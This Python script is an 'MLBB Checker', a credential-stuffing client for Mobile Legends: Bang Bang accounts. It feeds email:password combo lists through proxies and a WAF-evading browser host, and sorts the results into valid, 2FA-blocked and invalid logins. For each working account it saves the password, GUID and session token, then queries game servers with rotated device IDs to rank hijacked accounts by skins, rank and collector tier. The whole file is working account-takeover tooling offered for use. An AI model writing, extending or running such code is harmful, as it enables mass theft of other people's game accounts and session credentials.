import json, os, re, shutil, sys, time, threading
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="backslashreplace")
    except Exception:
        pass

BASE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(BASE)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)
if BASE not in sys.path:
    sys.path.insert(0, BASE)

INFO_OK = True
lookup_player_data = True
get_player_info = True
GameConnection = True
extract_player_data = True
_device_manager = True
try:
    from lookup import lookup_player_data as _lpd

    lookup_player_data = _lpd
    INFO_OK = True
except Exception:
    pass
try:
    from info import get_player_info as _gpi, DeviceManager as _DM
    from info import GameConnection as _GC, extract_player_data as _epd

    get_player_info = _gpi
    GameConnection = _GC
    extract_player_data = _epd
    for _dp in (
        os.path.join(BASE, "devices.txt"),
        os.path.join(_ROOT, "devices.txt"),
        "devices.txt",
    ):
        if os.path.isfile(_dp):
            try:
                _device_manager = _DM(_dp)
                break
            except Exception:
                pass
    INFO_OK = True
except Exception:
    pass

OUTPUT_DIR = os.path.join(BASE, "output")
# hostserver.py default (WAF_PORT=5555). Override with --api or interactive prompt.
API_URL = "http://127.0.0.1:5555"
NUM_CONTEXTS = 8
DEBUG = False
PROXY_POOL = []

# ============================================================================
#  UI
# ============================================================================
RESET = "\033[0m"
DIM = "\033[2m"
BD = "\033[1m"


def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"


CYAN = (75, 220, 255)
PURPLE = (175, 95, 255)
GREEN = (80, 235, 155)
GOLD = (255, 205, 80)
RED = (255, 85, 105)
WHITE = (238, 242, 255)
GRAY = (125, 135, 160)
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
W = "\033[0m"


def c(co):
    return rgb(*co)


def p_out(t, end="\n"):
    try:
        print(t, end=end, flush=True)
    except Exception:
        print(t.encode("ascii", "ignore").decode(), end=end, flush=True)


def clear_line():
    p_out("\033[2K\r", end="")


def dbg(msg):
    if DEBUG:
        clear_line()
        p_out(f"  {DIM}DBG {msg}{W}")
        print_progress()


def shortpath(p):
    try:
        r = os.path.relpath(p, BASE)
        return p if r.startswith("..") else r
    except Exception:
        return str(p)


stats = {"valid": 0, "invalid": 0, "2fa": 0, "error": 0, "checked": 0, "total": 0, "start": 0.0}
_stat_lock = threading.Lock()
HITS = []
_DASH_H = 0
COL_ORDER = [
    "World Collector",
    "Mega Collector",
    "Exalted Collector",
    "Renowned Collector",
    "Expert Collector",
    "Seasoned Collector",
    "Junior Collector",
    "Amateur Collector",
    "No Tier",
]
COL_SHORT = ["World", "Mega", "Exalted", "Renowned", "Expert", "Seasoned", "Junior", "Amateur", "None"]
RANK_ORDER = [
    "Mythical Immortal",
    "Mythical Glory",
    "Mythical Honor",
    "Mythic",
    "Legend",
    "Epic",
    "Grandmaster",
    "Master",
    "Elite",
    "Warrior",
]
RANK_SHORT = ["Immortal", "Glory", "Honor", "Mythic", "Legend", "Epic", "GM", "Master", "Elite", "Warrior"]


def _col_key(t):
    t = (t or "").strip() or "No Tier"
    for k in COL_ORDER:
        if t == k or t.startswith(k):
            return k
    return "No Tier"


def _rank_key(t):
    t = (t or "").strip() or ""
    for k in RANK_ORDER:
        if t.startswith(k):
            return k
    return ""


def _lv_num(lv):
    try:
        return int(lv)
    except Exception:
        return -1


def record_hit(email, password, pd):
    HITS.append(
        {
            "login": f"{email}:{password}",
            "nick": pd.get("nickname") or email,
            "lv": pd.get("level") or "?",
            "rank": pd.get("current_rank") or pd.get("high_rank") or "—",
            "col": pd.get("collector_tier") or "No Tier",
            "skins": pd.get("skin") or 0,
        }
    )


_ANSI = re.compile(r"\033\[[0-9;]*m")


def _vislen(s):
    return len(_ANSI.sub("", s))


def _rpad(s, w):
    n = w - _vislen(s)
    return s + (" " * max(n, 0))


def _term_inner():
    try:
        tw = shutil.get_terminal_size().columns
    except Exception:
        tw = 56
    return max(42, min(62, tw - 2))


def _ncell(label, n, lw=10):
    col = c(GREEN) if n else c(GRAY)
    return f"{c(GRAY)}{label:<{lw}}{W}{col}{n:>3}{W}"


def _pair_rows(keys, shorts, counts, inner, lw=10):
    cells = [_ncell(s, counts.get(k, 0), lw) for k, s in zip(keys, shorts)]
    rows = []
    i = 0
    while i < len(cells):
        line = " " + cells[i]
        if i + 1 < len(cells) and _vislen(line + "  " + cells[i + 1]) <= inner - 2:
            line += "  " + cells[i + 1]
            i += 2
        else:
            i += 1
        rows.append(_rpad(line, inner))
    return rows


def _dash_lines():
    inner = _term_inner()
    v, i, e, ck, t = stats["valid"], stats["invalid"], stats["error"], stats["checked"], stats["total"]
    tfa = stats["2fa"]
    el = max(time.time() - stats["start"], 0.001)
    rate = ck / el
    eta = (t - ck) / rate if rate > 0 else 0
    pct = ck / t * 100 if t else 0
    et = f"{int(eta // 60)}m{int(eta % 60):02d}s" if eta else "--"
    bw = max(10, inner - 28)
    filled = int(pct / 100 * bw)
    bar = (
        f" {c(CYAN)}{'█' * filled}{c(GRAY)}{'░' * (bw - filled)}{W} "
        f"{c(WHITE)}{pct:5.1f}%{W} {c(GRAY)}{ck}/{t}{W}"
    )
    meta = (
        f" {c(GREEN)}OK {v}{W}  "
        f"{c(PURPLE)}2FA {tfa}{W}  "
        f"{c(RED)}BAD {i}{W}  "
        f"{c(GOLD)}ERR {e}{W}  "
        f"{c(CYAN)}{rate:.1f}/s{W}  "
        f"{c(PURPLE)}ETA {et}{W}"
    )
    cols = Counter(_col_key(h["col"]) for h in HITS)
    ranks = Counter(_rank_key(h["rank"]) for h in HITS)
    top = sorted(HITS, key=lambda h: _lv_num(h["lv"]), reverse=True)[:3]
    sep = c(GRAY) + "─" * inner + W
    title = " DASHBOARD "
    side = max(0, (inner - len(title)) // 2)
    topb = c(CYAN) + "┌" + "─" * side + title + "─" * (inner - side - len(title)) + "┐" + W
    botb = c(CYAN) + "└" + "─" * inner + "┘" + W

    def row(s):
        return c(CYAN) + "│" + W + _rpad(s, inner) + c(CYAN) + "│" + W

    def hdr(s, col=GOLD):
        return row(f" {c(col)}{BD}{s}{W}")

    out = [topb, row(bar), row(meta), row(sep), hdr("COLLECTOR", GOLD)]
    out += [row(x) for x in _pair_rows(COL_ORDER, COL_SHORT, cols, inner)]
    out += [row(sep), hdr("RANK", PURPLE)]
    out += [row(x) for x in _pair_rows(RANK_ORDER, RANK_SHORT, ranks, inner, lw=9)]
    out += [row(sep), hdr("TOP LEVEL", CYAN)]
    if top:
        for n, h in enumerate(top, 1):
            nick = str(h["nick"] or "")[: max(8, inner - 16)]
            lv = h["lv"]
            lv_s = f"Lv{lv}" if str(lv) != "?" else "Lv?"
            out.append(row(f" {c(GRAY)}{n}.{W} {c(GREEN)}{lv_s:<5}{W} {c(WHITE)}{nick}{W}"))
    else:
        out.append(row(f" {c(GRAY)}no hits yet{W}"))
    out.append(botb)
    return out


def draw_dashboard():
    global _DASH_H
    lines = _dash_lines()
    if _DASH_H:
        sys.stdout.write(f"\033[{_DASH_H}A\033[J")
    sys.stdout.write("\n".join(lines) + "\n")
    sys.stdout.flush()
    _DASH_H = len(lines)


def log_block(lines):
    global _DASH_H
    with _stat_lock:
        if _DASH_H:
            sys.stdout.write(f"\033[{_DASH_H}A\033[J")
            _DASH_H = 0
            sys.stdout.flush()
        for ln in lines:
            p_out(ln)
        draw_dashboard()


def print_progress():
    with _stat_lock:
        draw_dashboard()


def print_result(rtype, email, password, msg=""):
    if rtype == "invalid":
        log_block([f" {c(RED)}[INVALID]{W} {email}:{password} {c(GRAY)}→ {msg}{W}"])
    elif rtype in ("error", "timeout"):
        log_block([f" {c(GOLD)}[ERROR]{W} {email}:{password} {c(GRAY)}→ {msg or 'Timeout'}{W}"])
    else:
        print_progress()


def print_hit(email, password, data, info=None):
    guid = data.get("guid", "?")
    sess = data.get("session", "?")
    name = data.get("name") or data.get("custom_account") or ""
    role = data.get("app_role_id", "")
    pd = _normalize_info(info) if info else {}
    nick = pd.get("nickname") or name
    fl = f"{email}:{password} | GUID:{guid} | Session:{sess}"
    if name:
        fl += f" | Name:{name}"
    if role:
        fl += f" | Role:{role}"
    if pd:
        fl += (
            f" | {nick} Lv{pd.get('level', '')} Skins:{pd.get('skin', '')} "
            f"{pd.get('current_rank', '')} {pd.get('collector_tier', '')}"
        )
    write_result("valid.txt", fl)
    rec = [
        f" {c(GREEN)}{BD}[  HIT  ]{W} {c(WHITE)}{email}:{password}{W}  {c(GREEN)}◆ {nick or guid or '?'}{W}"
    ]
    extra = [x for x in (f"guid {guid}" if guid else "", f"role {role}" if role else "") if x]
    if extra:
        rec.append(f"          {c(GRAY)}└─ {' · '.join(extra)}{W}")
    if pd:
        rec.append(
            f"          {c(GRAY)}└─ {nick} Lv{pd.get('level', '-')} "
            f"Skins:{pd.get('skin', '-')} {pd.get('current_rank', '-')} {pd.get('collector_tier', '')}{W}"
        )
    record_hit(email, password, pd)
    log_block(rec)


def print_2fa(email, password, data):
    login = f"{email}:{password}"
    guid = (data or {}).get("guid") or ""
    name = (data or {}).get("name") or ""
    line = login
    if guid:
        line += f" | GUID:{guid}"
    if name:
        line += f" | Name:{name}"
    line += " | Error_NeedEmailCode_login"
    write_result("2fa.txt", line)
    extra = " · ".join(
        x
        for x in (
            f"guid {guid}" if guid else "",
            f"name {name}" if name else "",
            "email code required",
        )
        if x
    )
    log_block(
        [
            f" {c(PURPLE)}{BD}[ 2FA  ]{W} {c(WHITE)}{login}{W}",
            f"          {c(GRAY)}└─ {extra}{W}",
        ]
    )


def _save(path, content):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "a", encoding="utf-8") as _fh:
            _fh.write(content + "\n")
    except Exception:
        pass


def write_result(fn, line):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(os.path.join(OUTPUT_DIR, fn), "a", encoding="utf-8") as f:
        f.write(line + "\n")


def _as_int(v):
    try:
        n = int(v)
        return n if n > 0 else None
    except (TypeError, ValueError):
        return None


def _info_pid(info):
    pd = info.get("player_data") if isinstance(info, dict) else None
    if isinstance(pd, dict) and pd.get("player_id") not in (None, "", "Unknown"):
        return _as_int(pd.get("player_id"))
    basic = ((info.get("data") or {}).get("basic_info") or {}) if isinstance(info, dict) else {}
    return _as_int(basic.get("player_id"))


def _ok_info(info, guid=None):
    if not info or info.get("status") != "success":
        return None
    g = _as_int(guid)
    pid = _info_pid(info)
    if g and pid and pid == g:
        return None
    return info


def _session_role(guid, session, tries=8):
    if not (GameConnection and _device_manager and guid and session):
        return None, None, None
    used = []
    for _ in range(tries):
        exclude = used[-1] if used else None
        device_id = _device_manager.get_next_device(exclude)
        if not device_id:
            break
        used.append(device_id)
        conn = None
        try:
            conn = GameConnection(device_id=device_id, device_manager=_device_manager)
            conn.connect()
            if not conn.login_to_login_server():
                continue
            if not conn.get_game_server():
                continue
            if not conn.connect_to_game_server():
                continue
            result = conn.get_account_info(int(guid), str(session), "and")
            if not result:
                result = conn.get_account_info(int(guid), str(session), "ios")
            if not result:
                continue
            rid, zone = conn.get_highest_level_role(result)
            if not rid or int(rid) == int(guid):
                continue
            detail = conn.get_role_detail(int(rid))
            rinfo = conn.get_role_info(int(rid), int(zone or 0)) if zone else None
            return result, detail, rinfo
        except Exception:
            pass
        finally:
            if conn:
                try:
                    conn.cleanup()
                except Exception:
                    pass
    return None, None, None


def _pick(*vals):
    for v in vals:
        if v not in (None, "", "—", "Unknown", "N/A", "NOT FOUND"):
            return v
    return None


def _normalize_info(info):
    if not info or info.get("status") != "success":
        return {}
    pd = dict(info.get("player_data") or {}) if isinstance(info.get("player_data"), dict) else {}
    data = info.get("data") or {}
    basic = data.get("basic_info") or {}
    game = data.get("game_info") or {}
    col = data.get("collector_info") or {}
    skin = data.get("skin_info") or {}
    loc = data.get("location_info") or {}
    extra = data.get("extra_info") or {}
    sb = skin.get("skin_breakdown") or pd.get("skin_breakdown") or {}
    return {
        "nickname": _pick(pd.get("nickname"), basic.get("nickname")),
        "level": _pick(pd.get("level"), basic.get("level")),
        "player_id": _pick(pd.get("player_id"), basic.get("player_id")),
        "server": _pick(pd.get("server"), basic.get("server")),
        "skin": _pick(pd.get("skin"), basic.get("skin_count"), sb.get("Total Skins"), sb.get("total")),
        "hero_count": _pick(pd.get("hero_count"), basic.get("hero_count")),
        "current_rank": _pick(pd.get("current_rank"), game.get("current_rank")),
        "high_rank": _pick(pd.get("high_rank"), game.get("high_rank")),
        "collector_tier": _pick(pd.get("collector_tier"), col.get("collector_tier")),
        "collector_point": _pick(pd.get("collector_point"), col.get("collector_point")),
        "squad": _pick(pd.get("squad"), game.get("squad")),
        "last_login": _pick(pd.get("last_login"), loc.get("last_login")),
        "last_login_country": _pick(pd.get("last_login_country"), loc.get("last_login_country")),
        "account_created": _pick(pd.get("account_created"), extra.get("creation_date"), loc.get("account_created")),
        "create_account_country": _pick(pd.get("create_account_country"), loc.get("create_account_country")),
        "location": _pick(pd.get("location"), loc.get("location")),
        "top3_most_used_heroes": _pick(pd.get("top3_most_used_heroes"), game.get("top3_most_used_heroes")),
        "hero_history": pd.get("hero_history") or game.get("hero_history"),
        "skin_breakdown": {
            "Supreme": sb.get("Supreme Skins") or sb.get("Supreme") or 0,
            "Grand": sb.get("Grand Skins") or sb.get("Grand") or 0,
            "Exceptional": sb.get("Exceptional Skins") or sb.get("Exceptional") or 0,
            "Deluxe": sb.get("Deluxe Skins") or sb.get("Deluxe") or 0,
            "Common": sb.get("Common Skins") or sb.get("Common") or 0,
            "total": sb.get("Total Skins") or sb.get("total") or pd.get("skin") or 0,
        },
    }


def fetch_info(role_or_guid, session=None, guid=None):
    g = _as_int(guid)
    role = _as_int(role_or_guid)
    if role and g and role == g:
        role = None
    if session and g and GameConnection:
        acc, detail, rinfo = _session_role(g, session)
        if detail and extract_player_data:
            try:
                res = extract_player_data(detail, rinfo)
                ok = _ok_info(res, g)
                if ok:
                    return ok
            except Exception:
                pass
        if acc:
            try:
                row = (acc.get(2) or [None])[0]
                if row:
                    role = role or _as_int(row.get(1) if hasattr(row, "get") else None)
            except Exception:
                pass
    if lookup_player_data and role and role != g:
        try:
            res = lookup_player_data(role)
            ok = _ok_info(res, g)
            if ok:
                return ok
        except Exception:
            pass
    return None


def format_full(email, pw, guid, sess, info):
    lines = [f"Login: {email}:{pw}", f"  GUID: {guid}", f"  Session: {sess}"]
    if not info or info.get("status") != "success":
        lines.append("  (no info)")
        return "\n".join(lines)
    pd = _normalize_info(info)

    def a(n, v):
        if v not in (None, "", "—", 0, "0", 0.0, "N/A", "Unknown"):
            lines.append(f"  {n}: {v}")

    a("Nickname", pd.get("nickname"))
    a("Level", pd.get("level"))
    a("Heroes", pd.get("hero_count"))
    a("Skins", pd.get("skin"))
    sb = pd.get("skin_breakdown") or {}
    for t in ("Supreme", "Grand", "Exceptional", "Deluxe"):
        if sb.get(t):
            lines.append(f"    {t}: {sb[t]}")
    a("Rank", pd.get("current_rank"))
    a("High Rank", pd.get("high_rank"))
    a("Collector", pd.get("collector_tier"))
    a("Collector Pts", pd.get("collector_point"))
    a("Squad", pd.get("squad"))
    a("Last Login", pd.get("last_login"))
    a("Created", pd.get("account_created"))
    a("Server", pd.get("server"))
    return "\n".join(lines)


def _safe_name(t):
    s = "".join(ch if ch.isalnum() or ch in " _-" else "_" for ch in (t or "")).strip()
    return s or "No Tier"


def load_combos(path):
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as _fh:
            for ln in _fh:
                ln = ln.strip()
                if ":" in ln:
                    a, b = ln.split(":", 1)
                    out.append((a.strip(), b.strip()))
    except FileNotFoundError:
        p_out(f"{R}[!] Not found: {path}{W}")
        sys.exit(1)
    return out


def parse_proxy(s):
    s = (s or "").strip()
    if not s or s.startswith("#"):
        return None
    if "://" in s:
        return s
    if "@" in s and s.count(":") >= 2:
        return "http://" + s
    parts = s.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        return f"http://{quote(user, safe='')}:{quote(pw, safe='')}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{s}"
    return "http://" + s


def load_proxies(path):
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as _fh:
            for ln in _fh:
                p = parse_proxy(ln.lstrip("\ufeff"))
                if p:
                    out.append(p)
    except FileNotFoundError:
        p_out(f"{R}[!] proxy file not found: {path}{W}")
        sys.exit(1)
    return out


# ============================================================================
#  HOST API (hostserver.py)
# ============================================================================
def api_get(path, timeout=8):
    with urlopen(API_URL.rstrip("/") + path, timeout=timeout) as r:
        return json.loads(r.read().decode())


def api_post(path, obj, timeout=90, _retries=1):
    data = json.dumps(obj).encode()
    for _attempt in range(_retries + 1):
        try:
            req = Request(
                API_URL.rstrip("/") + path,
                data=data,
                headers={"Content-Type": "application/json"},
            )
            with urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode())
        except (URLError, OSError) as _e:
            if _attempt < _retries:
                time.sleep(2.0)
                continue
            raise


def api_health(timeout=8):
    """hostserver exposes /api/status, not /health."""
    j = api_get("/api/status", timeout=timeout)
    if not isinstance(j, dict) or "pool" not in j:
        raise RuntimeError("bad /api/status payload")
    return j


def api_verdict(kind):
    """Feed host's dead-batch watchdog + valid/invalid counters. Best-effort."""
    try:
        api_post("/api/verdict", {"kind": kind}, timeout=5)
    except Exception:
        pass


def api_kill():
    """Ask host to drop pools / bump kill_gen (used on Ctrl+C)."""
    try:
        api_post("/api/kill", {}, timeout=5)
    except Exception:
        pass


# ============================================================================
#  MLBB LOGIN RESPONSE CLASSIFIER
# ============================================================================
# hostserver /api/login returns the RAW MLBB login JSON in `body`, e.g.
#   {"code":0,"message":"...","data":{"guid":"...","session":"...", ...}}
#   {"code":1086,"message":"...need email code..."}
# We classify it here.
_2FA_CODES = {1086, 1087, 1088, 1089, 1090}


def _classify_mlbb_body(raw):
    """Parse the raw login body returned by hostserver /api/login.

    Returns dict:
      {status, message, code, guid, session, app_role_id, need_email_code}
    status ∈ {"valid","invalid","2fa","error"}
    """
    out = {
        "status": "error",
        "message": "",
        "code": None,
        "guid": "",
        "session": "",
        "app_role_id": "",
        "need_email_code": False,
    }
    if not raw:
        out["message"] = "empty body"
        return out
    try:
        j = json.loads(raw)
    except Exception:
        out["message"] = str(raw)[:120]
        return out
    if not isinstance(j, dict):
        out["message"] = "non-object body"
        return out

    code = j.get("code")
    msg = (j.get("message") or j.get("msg") or "").strip()
    data = j.get("data") or {}
    if not isinstance(data, dict):
        data = {}
    out["code"] = code
    out["message"] = msg

    guid = data.get("guid") or j.get("guid") or ""
    sess = data.get("session") or j.get("session") or ""
    role = (
        data.get("app_role_id")
        or j.get("app_role_id")
        or (data.get("role") or {}).get("app_role_id")
        or ""
    )
    if guid:
        out["guid"] = str(guid)
    if sess:
        out["session"] = str(sess)
    if role:
        out["app_role_id"] = str(role)

    low = (msg or "").lower()
    need_email = (
        code in _2FA_CODES
        or ("email" in low and ("code" in low or "verif" in low))
        or ("needemailcode" in low.replace(" ", ""))
        or data.get("need_email_code") is True
        or j.get("need_email_code") is True
    )

    if (code == 0 or str(code) == "0") and out["guid"] and out["session"]:
        out["status"] = "valid"
    elif need_email:
        out["status"] = "2fa"
        out["need_email_code"] = True
    elif code not in (None, 0, "0"):
        out["status"] = "invalid"
    else:
        out["status"] = "error"
        out["message"] = out["message"] or "code=0 but no guid/session"
    return out


def _err_verdict(msg):
    return {
        "status": "error",
        "message": str(msg)[:160],
        "code": None,
        "guid": "",
        "session": "",
        "app_role_id": "",
        "need_email_code": False,
    }


# ============================================================================
#  ACCOUNT CHECK (talks to hostserver /api/login)
# ============================================================================
def check_one(idx, email, password):
    body = {"account": email, "password": password}
    if PROXY_POOL:
        # hostserver has its own PROXIES list, but forwards a per-request
        # `proxy` if supplied. Harmless if host ignores it.
        body["proxy"] = PROXY_POOL[idx % len(PROXY_POOL)]

    _login_exc = None
    for _lretry in range(2):
        try:
            r = api_post("/api/login", body, timeout=180)
            _login_exc = None
            break
        except Exception as e:
            _login_exc = e
            if _lretry == 0:
                time.sleep(1.5)
    if _login_exc is not None:
        r = {"ok": False, "error": "transport", "detail": str(_login_exc)[:160]}

    # hostserver contract:
    #   success -> {ok:true, status_code, body, attempts_used}
    #   failure -> {ok:false, error, detail, retryable?, attempts_used?}
    if isinstance(r, dict) and r.get("ok"):
        verdict = _classify_mlbb_body(r.get("body") or "")
        verdict["attempts"] = r.get("attempts_used")
        verdict["http_status"] = r.get("status_code")
    elif isinstance(r, dict):
        detail = r.get("detail") or r.get("error") or "unknown"
        verdict = _err_verdict(detail)
    else:
        verdict = _err_verdict("bad host response")

    st = verdict["status"]

    with _stat_lock:
        stats["checked"] += 1
        if st == "valid":
            stats["valid"] += 1
        elif st == "2fa":
            stats["2fa"] += 1
        elif st == "invalid":
            stats["invalid"] += 1
        else:
            stats["error"] += 1

    # Tell host so its dead-batch watchdog + counters stay accurate.
    api_verdict("valid" if st == "valid" else "invalid" if st == "invalid" else "error")

    if st == "valid":
        guid = verdict["guid"]
        sess = verdict["session"]
        role = verdict.get("app_role_id") or None
        info = None
        if INFO_OK and (role or guid) and str(role or guid) not in ("0", "None", ""):
            try:
                info = fetch_info(role, session=sess, guid=guid)
            except Exception:
                info = None
        _save(
            os.path.join(OUTPUT_DIR, "valid_detailed.txt"),
            format_full(email, password, guid, sess, info),
        )
        tier = ""
        pd = _normalize_info(info) if info else {}
        if pd:
            tier = pd.get("collector_tier", "") or ""
        _save(
            os.path.join(OUTPUT_DIR, "Collection Tier", "Full", f"{_safe_name(tier)}.txt"),
            format_full(email, password, guid, sess, info),
        )
        hit_data = {
            "guid": guid,
            "session": sess,
            "app_role_id": role or "",
            "name": "",
        }
        print_hit(email, password, hit_data, info)
    elif st == "2fa":
        print_2fa(email, password, {"guid": verdict["guid"], "name": ""})
    elif st == "invalid":
        write_result("invalid.txt", f"{email}:{password}")
        msg = verdict.get("message") or ""
        if verdict.get("code") not in (None, 0):
            msg = f"{msg} (code {verdict['code']})"
        print_result("invalid", email, password, msg)
    else:
        write_result("errors.txt", f"{email}:{password} | {verdict.get('message') or ''}")
        print_result("error", email, password, verdict.get("message") or "")


# ============================================================================
#  PROMPTS
# ============================================================================
def _ask(label, default=""):
    d = f" \033[90m[{default}]\033[0m" if default else ""
    try:
        v = input(f"  \033[96m❯\033[0m {label}{d}  \033[95m❯\033[0m ").strip().strip('"').strip("'")
    except EOFError:
        v = ""
    return v or default


def _ask_yn(label, default="n"):
    while True:
        try:
            r = input(f"  \033[96m❯\033[0m {label} \033[90m(y/n)\033[0m  \033[95m❯\033[0m ").strip().lower()
        except EOFError:
            r = ""
        if r in ("y", "yes", "n", "no", ""):
            return (default in ("y", "yes")) if r == "" else r in ("y", "yes")


# ============================================================================
#  MAIN
# ============================================================================
def main():
    global DEBUG, OUTPUT_DIR, NUM_CONTEXTS, PROXY_POOL, API_URL, HITS, _DASH_H
    import argparse

    pa = argparse.ArgumentParser(description="MLBB Checker — hostserver client")
    pa.add_argument("combo", nargs="?", default="")
    pa.add_argument("--workers", type=int, default=0)
    pa.add_argument("--out", type=str, default="")
    pa.add_argument("--debug", action="store_true")
    pa.add_argument("--no-prompt", action="store_true")
    pa.add_argument("--proxy", type=str, default="")
    pa.add_argument("--proxy-file", type=str, default="")
    pa.add_argument("--api", type=str, default="")
    args = pa.parse_args()

    PROXY_POOL = []
    HITS = []
    _DASH_H = 0
    if args.api:
        API_URL = args.api.rstrip("/")

    if args.no_prompt or (args.combo and args.workers > 0):
        combo_path = args.combo or os.path.join(BASE, "combo.txt")
        NUM_CONTEXTS = args.workers or 4
        DEBUG = args.debug
        OUTPUT_DIR = os.path.join(BASE, (args.out or "output").replace(" ", "_"))
        if args.proxy:
            PROXY_POOL = [parse_proxy(args.proxy)]
        elif args.proxy_file:
            PROXY_POOL = load_proxies(args.proxy_file)
        if args.api:
            API_URL = args.api.rstrip("/")
    else:
        os.system("cls" if os.name == "nt" else "clear")
        p_out(f"\n  {c(CYAN)}{BD}MLBB Checker{W} {c(GRAY)}— hostserver client{W}\n")
        combo_path = _ask("combo file", os.path.join(BASE, "combo.txt"))
        if not os.path.isabs(combo_path):
            t = os.path.join(BASE, combo_path)
            if os.path.exists(t):
                combo_path = t
        NUM_CONTEXTS = int(_ask("workers (1-50)", "4"))
        NUM_CONTEXTS = max(1, min(NUM_CONTEXTS, 50))
        DEBUG = _ask_yn("debug", "n")
        OUTPUT_DIR = os.path.join(BASE, _ask("output folder", "output").replace(" ", "_"))
        API_URL = _ask("host (hostserver.py url)", API_URL).rstrip("/")
        px = _ask("proxy or proxy file (blank=none)", "")
        if px:
            if os.path.isfile(px) or os.path.isfile(os.path.join(BASE, px)):
                fp = px if os.path.isfile(px) else os.path.join(BASE, px)
                PROXY_POOL = load_proxies(fp)
            else:
                p = parse_proxy(px)
                if p:
                    PROXY_POOL = [p]

    DEBUG = DEBUG or args.debug
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    if not os.path.isabs(combo_path):
        t = os.path.join(BASE, combo_path)
        if os.path.exists(t):
            combo_path = t

    # ---- host health (hostserver.py) ----
    try:
        h = api_health(timeout=8)
        pool = h.get("pool", "?")
        solved = h.get("solved", "?")
        browser = h.get("browser_available", "?")
        p_out(
            f"{c(GREEN)}[*] Host {API_URL} ✓ "
            f"(pool={pool} solved={solved} browser={browser}){W}"
        )
        if not browser:
            p_out(
                f"{c(GOLD)}[!] host has no browser — install `cloakbrowser` "
                f"or /api/login will 502{W}"
            )
    except (URLError, HTTPError) as e:
        p_out(f"{c(RED)}[!] Host down: {e}{W}")
        p_out(
            f"{c(GRAY)}    start hostserver.py first "
            f"(WAF_PORT=5555 by default){W}"
        )
        sys.exit(1)
    except Exception as e:
        p_out(f"{c(RED)}[!] Host down: {e}{W}")
        p_out(
            f"{c(GRAY)}    start hostserver.py first "
            f"(WAF_PORT=5555 by default){W}"
        )
        sys.exit(1)

    combos = load_combos(combo_path)
    p_out(f"{c(GREEN)}[*] Loaded {len(combos):,} combos{W}")

    if INFO_OK:
        mode = []
        if get_player_info and _device_manager:
            mode.append("session-info")
        if lookup_player_data:
            mode.append("lookup")
        p_out(f"{c(GREEN)}[*] Info ready ({'+'.join(mode) or 'partial'}){W}")
    else:
        p_out(f"{c(GOLD)}[*] info/lookup not loaded (optional){W}")

    done = set()
    for fn in ("valid.txt", "invalid.txt", "2fa.txt"):
        fp = os.path.join(OUTPUT_DIR, fn)
        if os.path.exists(fp):
            for ln in open(fp, "r", encoding="utf-8", errors="ignore"):
                ln = ln.strip()
                if ":" in ln:
                    em = ln.split(":")[0].strip()
                    if em:
                        done.add(em)
    combos = [x for x in combos if x[0] not in done]
    if done:
        p_out(f"{DIM}[*] Resuming: {len(combos):,} left ({len(done):,} done){W}")
    if not combos:
        p_out(f"{c(GREEN)}[*] Nothing to check.{W}")
        return

    stats["total"] = len(combos)
    stats["start"] = time.time()
    if PROXY_POOL:
        p_out(
            f"{c(GREEN)}[*] Proxies: {len(PROXY_POOL)} "
            f"(forwarded per-request; host may ignore){W}"
        )

    p_out(f"\n  {c(WHITE)}{BD}▸ Accounts:{W}  {len(combos):,}")
    p_out(f"  {c(WHITE)}{BD}▸ Workers:{W}   {NUM_CONTEXTS}")
    p_out(f"  {c(WHITE)}{BD}▸ Host:{W}      {API_URL}")
    p_out(f"  {c(WHITE)}{BD}▸ Output:{W}    {shortpath(OUTPUT_DIR)}")
    p_out(f"  {c(GOLD)}▸ Ctrl+C to stop{W}\n")
    draw_dashboard()

    try:
        with ThreadPoolExecutor(max_workers=NUM_CONTEXTS) as ex:
            futs = [ex.submit(check_one, i, a, pw) for i, (a, pw) in enumerate(combos)]
            for _ in as_completed(futs):
                pass
    except KeyboardInterrupt:
        p_out(f"\n{Y}[*] Stopping...{W}")
        # Tell host to drop warm pages / pending_logins / bump kill_gen.
        api_kill()

    el = time.time() - stats["start"]
    v, i, e, ck = stats["valid"], stats["invalid"], stats["error"], stats["checked"]
    rate = ck / max(el, 1)
    _DASH_H = 0
    p_out(f"\n  {c(GREEN)}{BD}═══ DONE ═══{W}")
    p_out(f"  {c(GREEN)}Valid:{W}    {v:,}")
    p_out(f"  {c(PURPLE)}2FA:{W}      {stats['2fa']:,}")
    p_out(f"  {c(RED)}Invalid:{W}  {i:,}")
    p_out(f"  {c(GOLD)}Errors:{W}   {e:,}")
    p_out(f"  {c(CYAN)}Speed:{W}    {rate:.1f}/s")
    p_out(f"  {c(PURPLE)}Time:{W}     {int(el)}s")
    p_out(f"  {c(GOLD)}◆ Results: {shortpath(OUTPUT_DIR)}{W}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        p_out(f"\n{Y}Stopped.{W}")